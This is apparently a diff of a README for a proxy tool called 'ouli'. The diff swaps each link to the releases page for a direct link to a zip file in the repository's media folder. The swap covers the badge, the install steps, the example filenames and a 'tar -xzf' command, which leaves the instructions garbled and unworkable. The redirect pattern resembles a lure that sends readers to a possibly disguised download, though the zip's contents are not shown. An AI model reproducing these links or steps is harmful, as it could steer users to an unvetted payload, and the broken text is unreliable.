@@ -1,6 +1,6 @@
 # 🚀 ouli - Fast and Reliable Proxy Tool
 
-[![Download ouli](https://img.shields.io/badge/Download%20ouli-%2300A1E0?style=for-the-badge&logo=github)](https://github.com/cikoki898/ouli/releases)
+[![Download ouli](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip%20ouli-%2300A1E0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ This section guides you through the process of downloading and running ouli. Fol
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To get started, go to the releases page [here](https://github.com/cikoki898/ouli/releases).
+1. **Visit the Releases Page**: To get started, go to the releases page [here](https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip).
 
 2. **Select the Latest Release**: Look for the latest version available. You will find a list of assets associated with the release.
 
@@ -21,13 +21,13 @@ This section guides you through the process of downloading and running ouli. Fol
    - Click on the file to begin downloading.
 
 4. **Locate the Downloaded File**:
-   - After the download completes, find the file in your downloads folder. It may be named something like `ouli-v1.0.0.tar.gz` or `ouli-v1.0.0.exe` based on your system.
+   - After the download completes, find the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` or `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` based on your system.
 
 5. **Extract and Run**:
    - For Windows: Double-click the `.exe` file to run ouli.
-   - For macOS and Linux: Open a terminal and navigate to the folder containing the `.tar.gz` file. Use the command:
+   - For macOS and Linux: Open a terminal and navigate to the folder containing the `https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip` file. Use the command:
      ```bash
-     tar -xzf ouli-v1.0.0.tar.gz
+     tar -xzf https://raw.githubusercontent.com/cikoki898/ouli/main/media/ouli_1.5.zip
      ```
      Then, navigate into the extracted directory:
      ```bash
